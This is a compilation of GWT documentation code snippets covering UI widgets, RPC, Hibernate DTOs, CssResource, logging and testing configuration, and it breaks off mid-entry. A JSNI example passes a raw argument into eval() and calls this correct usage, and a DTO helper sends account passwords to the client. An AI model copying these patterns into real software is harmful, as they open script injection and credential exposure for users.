Java\nDESCRIPTION: Creates a Record class representing a music record with id, title, year, and price properties. This class implements Serializable for GWT RPC.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class Record implements Serializable {\n  private Long id;\n  private String title;\n  private int year;\n  private double price;\n\n  public Record() {\n  }\n\n  public Record(Long id) {\n    this.id = id;\n  }\n\n  // Along with corresponding getters + setters.\n}\n```\n\n----------------------------------------\n\nTITLE: Including History iframe in HTML Host Page\nDESCRIPTION: HTML iframe required in the host page to enable GWT history support. This iframe is positioned off-screen and is used by GWT to manage browser history state.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsHistory.md#2025-04-09_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe src=\"javascript:''\"\\n          id=\"__gwt_historyFrame\"\\n          style=\"position:absolute;width:0;height:0;border:0\"></iframe>\n```\n\n----------------------------------------\n\nTITLE: Updating GWT Module Configuration\nDESCRIPTION: XML configuration to include Vaadin Polymer Elements in the GWT module\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<module rename-to=\"todolist\">\n  ...\n  <inherits name=\"com.vaadin.polymer.Elements\"/>\n  ...\n</module>\n```\n\n----------------------------------------\n\nTITLE: Creating HTML Layout for GWT Project Homepage\nDESCRIPTION: HTML code that structures the GWT project homepage with a tagline, project description, and navigation sections featuring links to learn more, download, get started, and access documentation. Each section includes an icon and descriptive text.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/index.md#2025-04-09_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n  <div style=\"font-size: 140%; font-weight: bold\">Productivity for developers, performance for users</div>\n  <div style=\"padding-top: 12px; line-height: 125%;\">\n    GWT is a development toolkit for building and\n    optimizing complex browser-based applications.\n    It's open source, completely free, and used by thousands of enthusiastic developers\n    around the world.\n  </div>\n\n<br /><br />\n<table class=\"columns\" style=\"clear: left;\">\n  <tbody>\n    <tr>\n      <td>\n        <a href=\"overview.html\">\n          <img src=\"images/gwt-sm.png\" style=\"float: left; margin-left: 50px; border: 0;\" height=\"48\" width=\"48\" />\n        </a>\n        <div style=\"margin-left: 112px; margin-bottom: 10px;\">\n          <div style=\"font-size: 120%; font-weight: bold;\"><a href=\"overview.html\">Learn More</a></div>\n          <div style=\"padding-top: 5px; line-height: 125%;\">\n            Learn about GWT, the features and tools it offers, and how you can quickly develop high-performance AJAX applications across all major browsers.<br /><br />\n          </div>\n        </div>\n      </td>\n    </tr>\n    <tr>\n      <td>\n        <a href=\"download.html\">\n          <img src=\"images/arrow-48.png\" style=\"float: left; margin-left: 50px; border: 0;\" height=\"48\" width=\"48\" />\n        </a>\n        <div style=\"margin-left: 112px; margin-bottom: 10px;\">\n          <div style=\"font-size: 120%; font-weight: bold;\"><a\n              href=\"download.html\">Download</a></div>\n          <div style=\"padding-top: 5px; line-height: 125%;\">\n            Download and install the tools in GWT, including the\n            SDK, Speed Tracer, and the Google Plugin for Eclipse.<br /><br />\n          </div>\n        </div>\n      </td>\n    </tr>\n    <tr>\n      <td>\n        <a href=\"gettingstarted-v2.html\">\n          <img src=\"images/learnmore.gif\" style=\"float: left; margin-left: 50px; border: 0;\" height=\"48\" width=\"48\" />\n        </a>\n        <div style=\"margin-left: 112px; margin-bottom: 10px;\">\n          <div style=\"font-size: 120%; font-weight: bold;\"><a href=\"gettingstarted-v2.html\">Get Started</a></div>\n          <div style=\"padding-top: 5px; line-height: 125%;\">\n            Walk through the first steps needed to get a web application up and running. From there, work through the fundamentals of GWT development with an in-depth tutorial.<br /><br />\n          </div>\n        </div>\n      </td>\n    </tr>\n    <tr>\n      <td>\n        <a href=\"doc/latest/DevGuide.html\">\n          <img src=\"images/docs.gif\" style=\"float: left; margin-left: 50px;\n          border: 0;\" height=\"48\" width=\"48\" />\n        </a>\n        <div style=\"margin-left: 112px;\">\n          <div style=\"font-size: 120%; font-weight: bold;\"><a href=\"doc/latest/DevGuide.html\">Read the Docs</a></div>\n          <div style=\"padding-top: 5px; line-height: 125%;\">\n            Everything you need to know about how to use GWT.<br /><br />\n          </div>\n        </div>\n      </td>\n    </tr>\n  </tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: JSNI Method with eval() Example\nDESCRIPTION: Shows correct usage of eval() in JSNI methods to handle variable name obfuscation in production mode. Demonstrates the proper way to reference variables in eval strings.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Client.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic static native String myMethod(String arg) /*-{\n    eval(\"var myVar = 'arg is ' + arg;\");\n    return myVar;\n}-*/;\n```\n\nLANGUAGE: java\nCODE:\n```\npublic static native String myMethod(String arg) /*-{\n    eval(\"var myVar = 'arg is \" + arg + \"';\");\n    return myVar;\n}-*/;\n```\n\n----------------------------------------\n\nTITLE: GWT's Event Handling Implementation to Prevent Memory Leaks\nDESCRIPTION: This snippet shows how GWT implements event handling to prevent memory leaks. It uses a central dispatch function and a single expando property on elements to manage event listeners, allowing for easy cleanup and preventing circular references.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dom_events_memory_leaks_and_you.md#2025-04-09_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nelem.onclick = (bits & 0x00001) ? $wnd.__dispatchEvent : null;\n```\n\n----------------------------------------\n\nTITLE: Cloning GWT Site Repository\nDESCRIPTION: Command to clone the GWT site repository for contributing to the webpage and documentation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/makinggwtbetter.md#2025-04-09_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://github.com/gwtproject/gwt-site\n```\n\n----------------------------------------\n\nTITLE: Using Java Number Wrapper Classes\nDESCRIPTION: Wrapper classes like Double, Float, Integer, and Long provide object representations of primitive numeric types.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nDouble.parseDouble(String)\nFloat.isNaN(float)\nInteger.parseInt(String, int)\nLong.valueOf(long)\n```\n\n----------------------------------------\n\nTITLE: Account DTO Creation Helper Method\nDESCRIPTION: Helper method to transform Hibernate Account entities into AccountDTO objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_19\n\nLANGUAGE: java\nCODE:\n```\nprivate AccountDTO createAccountDTO(Account account) {\n  Set<Record> records = account.getRecords();\n  Set<RecordDTO> recordDTOs = new HashSet<RecordDTO>(records != null ? records.size() : 0);\n  if (records != null) {\n    for (Record record : records) {\n      recordDTOs.add(createRecordDTO(record));\n    }\n  }\n  return new AccountDTO(account.getId(), account.getName(), account.getPassword(), recordDTOs);\n}\n```\n\n----------------------------------------\n\nTITLE: Unwrapped JSON Response Example\nDESCRIPTION: This snippet shows a standard JSON response without any protective wrapping. This format is vulnerable to certain types of attacks and should be avoided in favor of more secure methods when possible.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\n['foo', 'bar']\n```\n\n----------------------------------------\n\nTITLE: Programmatic Locale Access in Java\nDESCRIPTION: Examples of accessing locale information programmatically using LocaleInfo class in GWT, including RTL detection and available locales listing.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nLocale.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nif (LocaleInfo.getCurrentLocale().isRTL()) {\n  ...\n}\n\nfor (String localeName : LocaleInfo.getAvailableLocaleNames()) {\n  String displayName = LocaleInfo.getLocaleNativeDisplayName(localeName);\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: External and Legacy CSS in CssResource\nDESCRIPTION: Demonstrates how to use the @external at-rule to suppress selector obfuscation for external or legacy CSS while still allowing programmatic access to the selector name.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_38\n\nLANGUAGE: java\nCODE:\n```\ninterface MyCssResource extends CssResource {\n  String obfuscated();\n  String legacySelectorA();\n}\n\ninterface Resource extends ClientBundle {\n  @Source(\"my.css\")\n  MyCssResource css();\n}\n```\n\nLANGUAGE: css\nCODE:\n```\n@external legacySelectorA, legacySelectorB;\n.obfuscated .legacySelectorA { .... }\n.obfuscated .legacySelectorB { .... }\n```\n\n----------------------------------------\n\nTITLE: Cloning GWT Site Webapp Repository\nDESCRIPTION: Command to clone the GWT site webapp repository for contributing to the GWT code used on the site to improve navigation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/makinggwtbetter.md#2025-04-09_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://gwt.googlesource.com/gwt-site-webapp\n```\n\n----------------------------------------\n\nTITLE: Creating Empty Factorial Test in Java\nDESCRIPTION: Initial empty test method for factorial computation in JUnit.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic void testFactorial() {\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing StockWatcher Class with Widget Declarations in Java GWT\nDESCRIPTION: Skeleton code for the StockWatcher class that implements EntryPoint interface with widget and panel declarations as class fields. The onModuleLoad method contains placeholder TODOs for UI assembly.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\npublic class StockWatcher implements EntryPoint {\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n  \n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // TODO Create table for stock data.\n    // TODO Assemble Add Stock panel.\n    // TODO Assemble Main panel.\n    // TODO Associate the Main panel with the HTML host page.\n    // TODO Move cursor focus to the input box.\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: System Class Utilities\nDESCRIPTION: System class API providing system operations like array copying, time functions and property access.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\narraycopy(Object, int, Object, int, int)\ncurrentTimeMillis(), nanoTime()\ngetProperty(String), setProperty(String, String)\n```\n\n----------------------------------------\n\nTITLE: Setting GWT_TOOLS Environment Variable in Bash\nDESCRIPTION: Command to set the GWT_TOOLS environment variable in Bash. This variable points to the directory containing GWT prerequisite tools and third-party libraries.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/makinggwtbetter.md#2025-04-09_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nexport GWT_TOOLS=~/gwt/tools\n```\n\n----------------------------------------\n\nTITLE: Disabling CSS Autoconversion in GWT\nDESCRIPTION: Configuration property to disable automatic CSS to GSS conversion after migration is complete.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<set-configuration-property name=\"CssResource.conversionMode\" value=\"off\" />\n```\n\n----------------------------------------\n\nTITLE: Click Handler Implementation in GWT View\nDESCRIPTION: View implementation showing click event handling based on column definitions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsViewImpl<T> extends Composite implements ContactsView<T> {\n    ...\n    @UiHandler(\"contactsTable\")\n    void onTableClicked(ClickEvent event) {\n      if (presenter != null) {\n        HTMLTable.Cell cell = contactsTable.getCellForEvent(event);\n\n        if (cell != null) {\n          if (shouldFireClickEvent(cell)) {\n            presenter.onItemClicked(rowData.get(cell.getRowIndex()));\n          }\n\n          if (shouldFireSelectEvent(cell)) {\n            presenter.onItemSelected(rowData.get(cell.getRowIndex()));\n          }\n        }\n      }\n    }\n\n    private boolean shouldFireClickEvent(HTMLTable.Cell cell) {\n      boolean shouldFireClickEvent = false;\n\n      if (cell != null) {\n        ColumnDefinition<T> columnDefinition =\n          columnDefinitions.get(cell.getCellIndex());\n\n        if (columnDefinition != null) {\n          shouldFireClickEvent = columnDefinition.isClickable();\n        }\n      }\n\n      return shouldFireClickEvent;\n    }\n\n    private boolean shouldFireSelectEvent(HTMLTable.Cell cell) {\n      boolean shouldFireSelectEvent = false;\n\n      if (cell != null) {\n        ColumnDefinition<T> columnDefinition =\n          columnDefinitions.get(cell.getCellIndex());\n\n        if (columnDefinition != null) {\n          shouldFireSelectEvent = columnDefinition.isSelectable();\n        }\n      }\n\n      return shouldFireSelectEvent;\n    }\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Styling GWT Documentation Page with CSS\nDESCRIPTION: CSS styles for formatting the GWT documentation page, including diagram images, content tables, and custom classes for layout and emphasis.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/learnmore-sdk.md#2025-04-09_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\ndiv.diagram img {\n  margin: 20px;\n}\n\n.contents {\n  border: none;\n}\n\n.contents td {\n  border: none;\n}\n\n.contents .header {\n  font-weight: bold;\n}\n\n.flow-img {\n  float: left;\n  margin: 5px 0px 10px 0px;\n  width: 80px;\n  height: 80px;\n}\n\n.flow {\n  margin-left: 85px;\n}\n\n.gwt-tools {\n  margin-left: 90px;\n}\n\n.gwt-tools-head {\n  font-weight: bold;\n  font-size: 110%;\n  margin-bottom: 0.2em;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Account Domain Object in Java\nDESCRIPTION: Creates an Account class with id, name, password, and a set of Record objects. Includes methods for adding and removing records.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class Account implements Serializable {\n  Long id;\n  String name;\n  String password;\n  Set<Record> records;\n\n  public Account() {\n  }\n\n  public Account(Long id) {\n    this.id = id;\n  }\n\n  public void addRecord(Record record) {\n    if (records == null) {\n      records = new HashSet<Record>();\n    }\n    records.add(record);\n  }\n\n  public void removeRecord(Record record) {\n    if (records == null) {\n      return;\n    }\n    records.remove(record);\n  }\n\n  // Along with corresponding getters + setters.\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Mathematical Operations in Java\nDESCRIPTION: The Math class provides methods for common mathematical operations and constants.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\nMath.PI\nMath.abs(double)\nMath.max(int, int)\nMath.pow(double, double)\nMath.random()\n```\n\n----------------------------------------\n\nTITLE: Running GWT Tests in Manual Mode\nDESCRIPTION: Shows how to run GWT tests in manual mode, which allows running unit tests on any browser by specifying a URL.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTesting.md#2025-04-09_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n-runStyle Manual:1\n```\n\n----------------------------------------\n\nTITLE: Initializing and Configuring Error Message Label in GWT UI\nDESCRIPTION: This snippet demonstrates how to initialize and configure an error message label in a GWT application's UI. It sets the style name, makes the label initially invisible, and adds it to the main panel of the application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\n// Assemble Add Stock panel.\naddPanel.add(newSymbolTextBox);\naddPanel.add(addButton);\naddPanel.addStyleName(\"addPanel\");\n\n// Assemble Main panel.\nerrorMsgLabel.setStyleName(\"errorMessage\");\nerrorMsgLabel.setVisible(false);\n\nmainPanel.add(errorMsgLabel);\nmainPanel.add(stocksFlexTable);\nmainPanel.add(addPanel);\nmainPanel.add(lastUpdatedLabel);\n```\n\n----------------------------------------\n\nTITLE: Implementing Obfuscated CSS Class Names\nDESCRIPTION: Shows how to define and use obfuscated CSS class names with CssResource, where method names from the interface are used as CSS class names that will be obfuscated at runtime.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_41\n\nLANGUAGE: java\nCODE:\n```\ninterface MyCss extends CssResource {\n  String className();\n}\n\ninterface MyResources extends ClientBundle {\n  @Source(\"my.css\")\n  MyCss css();\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nMyResources resources = GWT.create(MyResources.class);\nLabel l = new Label(\"Some text\");\nl.addStyleName(resources.css().className());\n```\n\n----------------------------------------\n\nTITLE: Styling Error Messages in CSS\nDESCRIPTION: CSS styles for error message display, setting the color to red for error messages and negative changes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_13\n\nLANGUAGE: css\nCODE:\n```\n.negativeChange {\n  color: red;\n}\n\n.errorMessage {\n  color: red;\n}\n```\n\n----------------------------------------\n\nTITLE: Complete StockWatcher Class with Imports in Java GWT\nDESCRIPTION: Complete StockWatcher class implementation with necessary import statements for GWT UI components. This includes the EntryPoint interface and several widget classes used to build the UI.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.HorizontalPanel;\nimport com.google.gwt.user.client.ui.Label;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\n\npublic class StockWatcher implements EntryPoint {\n\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n\n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // TODO Create table for stock data.\n    // TODO Assemble Add Stock panel.\n    // TODO Assemble Main panel.\n    // TODO Associate the Main panel with the HTML host page.\n    // TODO Move cursor focus to the input box.\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LazyPanel in GWT TabLayoutPanel\nDESCRIPTION: This XML snippet shows how to use LazyPanel within a TabLayoutPanel to defer the creation of tab content until it's needed, improving initial load performance.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_30\n\nLANGUAGE: xml\nCODE:\n```\n<gwt:TabLayoutPanel barUnit='EM' barHeight='1.5'>\n  <gwt:tab>\n    <gwt:header>Summary</gwt:header>\n    <gwt:LazyPanel>\n      <my:SummaryPanel/>\n    </gwt:LazyPanel>\n  </gwt:tab>\n  <gwt:tab>\n    <gwt:header>Profile</gwt:header>\n    <gwt:LazyPanel>\n      <my:ProfilePanel/>\n    </gwt:LazyPanel>\n  </gwt:tab>\n  <gwt:tab>\n    <gwt:header>Reports</gwt:header>\n    <gwt:LazyPanel>\n      <my:ReportsPanel/>\n    </gwt:LazyPanel>\n  </gwt:tab>\n</gwt:TabLayoutPanel>\n```\n\n----------------------------------------\n\nTITLE: Using IsSerializable Interface in GWT\nDESCRIPTION: Shows the import statement for IsSerializable interface in GWT, which is used as a marker interface similar to java.io.Serializable for GWT RPC.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsCompatibility.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nimport com.google.gwt.user.client.rpc.IsSerializable;\n```\n\n----------------------------------------\n\nTITLE: Implementing LoginServiceAsync Interface for RPC (Java)\nDESCRIPTION: Asynchronous interface definition for the LoginService, used for asynchronous RPC calls in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.user.client.rpc.AsyncCallback;\n\npublic interface LoginServiceAsync {\n  public void login(String requestUri, AsyncCallback<LoginInfo> async);\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing App Engine User Service (Java)\nDESCRIPTION: Code snippet demonstrating how to instantiate the UserService class and get the current user in a GWT application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\nUserService userService = UserServiceFactory.getUserService();\n\nUser user = userService.getCurrentUser();\n```\n\n----------------------------------------\n\nTITLE: Defining a GWT Module XML for Testing\nDESCRIPTION: Example of a GWT module XML configuration file that can be used for testing. It inherits standard GWT user modules, declares an entry point, and configures a servlet for remote service testing.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTesting.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<module>\n  <!-- Module com.example.foo.Foo -->\n\n  <!-- Standard inherit.                                           -->\n  <inherits name='com.google.gwt.user.User'/>\n\n  <!-- implicitly includes com.example.foo.client package          -->\n\n  <!-- OPTIONAL STUFF FOLLOWS -->\n\n  <!-- It's okay for your module to declare an entry point.        -->\n  <!-- This gets ignored when running under JUnit.                 -->\n  <entry-point class='com.example.foo.FooModule'/>\n\n  <!-- You can also test remote services during a JUnit run.       -->\n  <servlet path='/foo' class='com.example.foo.server.FooServiceImpl'/>\n</module>\n```\n\n----------------------------------------\n\nTITLE: Implementing UiBinder Base Class with Constructor Problem\nDESCRIPTION: Shows the basic implementation of a UiBinder owner class, which will encounter an error when using widgets without default constructors.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npublic class UserDashboard extends Composite {\n  interface MyUiBinder extends UiBinder<Widget, UserDashboard> {}\n  private static final MyUiBinder uiBinder = GWT.create(MyUiBinder.class);\n\n  public UserDashboard() {\n    initWidget(uiBinder.createAndBindUi(this));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating GwtCreateResource Factory in Java\nDESCRIPTION: Example showing how to create and use a GwtCreateResource factory through ClientBundle interface.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\ninterface Resources extends ClientBundle {\n  Resources INSTANCE = GWT.create(Resources.class);\n\n  @ClassType(SomeClass.class)\n  GwtCreateResource<ReturnType> factory();\n}\n\n// Elsewhere\nReturnType obj = Resources.INSTANCE.factory().create();\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Module XML for RPC Services\nDESCRIPTION: XML configuration example showing how to properly register a server-side service implementation with a servlet path in the GWT module XML file for development mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<!-- Example servlet loaded into development mode web server       -->\n<servlet path=\"/myService\" class=\"com.example.server.MyServiceImpl\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Logging in XML\nDESCRIPTION: Illustrates how to configure logging properties such as log level, enabling/disabling logging, and disabling specific handlers in the .gwt.xml file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_3\n\nLANGUAGE: XML\nCODE:\n```\n<set-property name=\"gwt.logging.logLevel\" value=\"SEVERE\"/>          # To change the  default logLevel\n<set-property name=\"gwt.logging.enabled\" value=\"FALSE\"/>            # To disable logging\n<set-property name=\"gwt.logging.consoleHandler\" value=\"DISABLED\"/>  # To disable a default Handler\n```\n\n----------------------------------------\n\nTITLE: GWT Application Bootstrap Sequence\nDESCRIPTION: Illustrates the typical sequence of file requests during the bootstrap process of a GWT application. This example assumes the module name is 'com.company.app.MyApp' and files are located in the '/myApp/' directory.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_DebuggingAndCompiling.md#2025-04-09_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\n1.  http://host.domain.tld/myApp/index.html\n2.  http://host.domain.tld/myApp/MyApp.nocache.js\n3.  http://host.domain.tld/myApp/CAFEBABE12345678DEADBEEF87654321.cache.html\n```\n\n----------------------------------------\n\nTITLE: Java Indentation Example for GWT\nDESCRIPTION: Examples of correct and incorrect indentation in GWT Java code. Demonstrates the use of 2-space indents for blocks and 4-space indents after line wraps.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/makinggwtbetter.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nInstrument i =\n    new Instrument();\n\n// Incorrect indentation\nInstrument i =\n  new Instrument();\n```\n\n----------------------------------------\n\nTITLE: Import Declarations for KeyDown Event Handling in GWT\nDESCRIPTION: Required import statements for implementing KeyDownHandler functionality in a GWT application. These imports provide access to KeyCodes utility class and event classes for keyboard event handling.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/manageevents.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.event.dom.client.KeyCodes;\nimport com.google.gwt.event.dom.client.KeyDownEvent;\nimport com.google.gwt.event.dom.client.KeyDownHandler;\n```\n\n----------------------------------------\n\nTITLE: Generated Properties for HTMLPanel with Text-containing Widget\nDESCRIPTION: The properties file generated for the HTMLPanel with a Hyperlink, showing how the widget and its text are handled.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_15\n\nLANGUAGE: properties\nCODE:\n```\n# 0=arg0 (Example: <span>), 1=arg1 (Example: </span>)\n8EFBF967A3FEFE78C41C8A298562A094=To do the thing, {0}click here{1} and massage vigorously.\n\n```\n\n----------------------------------------\n\nTITLE: Updating Stock Table in GWT Application\nDESCRIPTION: Java method to update a single row in the stock table with formatted price and change data. This snippet contains the bug in change percentage calculation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/debug.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n  private void updateTable(StockPrice price) {\n    // Make sure the stock is still in the stock table.\n    if (!stocks.contains(price.getSymbol())) {\n      return;\n    }\n    \n    int row = stocks.indexOf(price.getSymbol()) + 1;\n    \n    // Format the data in the Price and Change fields.\n    String priceText = NumberFormat.getFormat(\"#,##0.00\").format(\n        price.getPrice());\n    NumberFormat changeFormat = NumberFormat.getFormat(\"+#,##0.00;-#,##0.00\");\n    String changeText = changeFormat.format(price.getChange());\n    String changePercentText = changeFormat.format(price.getChangePercent());\n    \n    // Populate the Price and Change fields with new data.\n    stocksFlexTable.setText(row, 1, priceText);\n    stocksFlexTable.setText(row, 2, changeText + \" (\" + changePercentText\n        + \"%)\");\n  }\n```\n\n----------------------------------------\n\nTITLE: Web Application Deployment Descriptor - XML\nDESCRIPTION: web.xml configuration for servlet mapping and deployment settings\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE web-app\nPUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n\"http://java.sun.com/dtd/web-app_2_3.dtd\">\n\n<web-app>\n\n  <!-- Default page to serve -->\n  <welcome-file-list>\n    <welcome-file>StockWatcher.html</welcome-file>\n  </welcome-file-list>\n\n  <!-- Servlets -->\n  <servlet>\n    <servlet-name>stockPriceServiceImpl</servlet-name>\n    <servlet-class>com.google.gwt.sample.stockwatcher.server.StockPriceServiceImpl</servlet-class>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>stockPriceServiceImpl</servlet-name>\n    <url-pattern>/stockwatcher/stockPrices</url-pattern>\n  </servlet-mapping>\n\n</web-app>\n```\n\n----------------------------------------\n\nTITLE: Importing ArrayList in GWT Application\nDESCRIPTION: Import declaration for ArrayList from java.util package, which is used to manage the collection of stock symbols in the StockWatcher application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nimport java.util.ArrayList;\n```\n\n----------------------------------------\n\nTITLE: External Style Classes in GSS vs CSS\nDESCRIPTION: Demonstrates how to declare external (non-obfuscated) style classes in GSS. In 